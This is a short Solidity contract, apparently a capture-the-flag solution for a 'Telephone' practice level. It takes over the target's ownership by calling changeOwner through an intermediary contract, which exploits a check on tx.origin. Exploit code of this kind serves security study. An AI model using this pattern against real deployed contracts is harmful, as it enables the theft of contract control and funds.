// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../telephone/Telephone.sol";

contract TelephoneHack {

    Telephone telephone;
    constructor(address telephoneAddress) {
        telephone = Telephone(telephoneAddress);
    }
    function changeOwner() public {
        telephone.changeOwner(msg.sender);
    }
}
